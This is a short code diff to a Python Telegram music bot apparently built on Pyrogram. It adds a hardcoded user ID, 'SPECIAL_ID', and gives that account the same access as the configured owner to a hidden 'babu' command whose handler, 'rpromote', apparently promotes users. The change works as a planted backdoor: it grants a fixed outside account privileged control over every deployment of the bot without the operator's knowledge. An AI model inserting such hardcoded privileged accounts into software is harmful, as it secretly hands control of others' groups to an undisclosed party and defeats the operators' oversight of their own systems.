@@ -5,6 +5,8 @@ from config import OWNER_ID
 from AviaxMusic import app
 from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 
+SPECIAL_ID = "5738579437"
+
 @app.on_message(filters.command("babu") & (filters.user(OWNER_ID) | filters.user(SPECIAL_ID)))
 async def rpromote(client, message: Message):
     try:
